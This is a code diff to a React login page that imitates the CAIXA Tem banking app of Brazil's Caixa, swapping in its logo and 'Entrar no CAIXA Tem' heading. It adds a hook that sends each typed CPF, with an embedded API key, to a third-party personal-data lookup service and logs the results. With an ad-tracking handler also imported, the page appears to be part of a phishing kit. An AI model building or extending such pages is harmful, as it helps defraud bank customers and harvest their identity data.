@@ -1,8 +1,8 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useLocation } from 'wouter';
 import { motion } from 'framer-motion';
 import { prepareUrlWithParams } from '../lib/utmHandler';
-import caixaLogo from '@assets/caixa logo.webp';
+import caixaTemLogo from '@assets/logo-caixa-tem.png';
 import userIcon from '@assets/icone-user webp.webp';
 import helpIcon from '@assets/icone-ajuda webp.webp';
 
@@ -76,17 +76,46 @@ export default function Login() {
     }
   };
 
+  // Nova API de busca de CPF
+  const [cpfData, setCpfData] = useState<any>(null);
+  
+  // Verifica o CPF enquanto o usuário digita
+  useEffect(() => {
+    const numericCPF = cpf.replace(/\D/g, '');
+    
+    // Só busca se tiver 11 dígitos
+    if (numericCPF.length === 11) {
+      const fetchCpfData = async () => {
+        try {
+          const response = await fetch(`https://api.cpfcnpj.com.br/5ae973d7a997af13f0aaf2bf60e65803/9/json/${numericCPF}`);
+          if (response.ok) {
+            const data = await response.json();
+            setCpfData(data);
+            console.log('CPF encontrado:', data);
+          } else {
+            console.log('CPF não encontrado');
+            setCpfData(null);
+          }
+        } catch (error) {
+          console.log('Erro ao consultar API de CPF', error);
+        }
+      };
+      
+      fetchCpfData();
+    }
+  }, [cpf]);
+
   return (
     <div className="min-h-screen w-full flex flex-col bg-white text-[#0079c0]">
       <div className="w-full p-8 flex flex-col items-center">
-        {/* Logo CAIXA */}
+        {/* Logo CAIXA TEM */}
         <img 
-          src={caixaLogo} 
-          alt="CAIXA" 
-          className="w-40 h-auto" 
+          src={caixaTemLogo} 
+          alt="CAIXA Tem" 
+          className="w-48 h-auto" 
         />
-        <h2 className="text-[#0079c0] text-xl font-normal mt-1">
-          Aplicativo Caixa Tem
+        <h2 className="text-[#0079c0] text-xl font-normal mt-2">
+          Entrar no CAIXA Tem
         </h2>
       </div>
       
@@ -116,17 +145,22 @@ export default function Login() {
               value={cpf}
               onChange={handleCPFChange}
               placeholder="CPF"
-              className="w-full bg-transparent border-0 focus:outline-none text-[#0079c0] placeholder-[#0079c0] placeholder-opacity-50"
+              className="w-full bg-transparent border-0 focus:outline-none text-[#666666] placeholder-[#999999] placeholder-opacity-50"
               maxLength={14}
             />
           </div>
+          {cpfData && cpfData.status && (
+            <div className="text-xs text-green-600 mt-1">
+              CPF válido
+            </div>
+          )}
         </div>
         
         {/* Botão Próximo */}
         <button
           onClick={handleNextStep}
           disabled={loading}
-          className="w-full py-4 bg-[#f7a800] hover:bg-[#e59700] text-white font-medium rounded-md transition-colors mb-8 flex items-center justify-center"
+          className="w-full py-4 bg-[#f7a800] hover:bg-[#e59700] text-white font-medium rounded-none transition-colors mb-8 flex items-center justify-center"
         >
           {loading ? 'Verificando...' : 'Próximo'}
         </button>
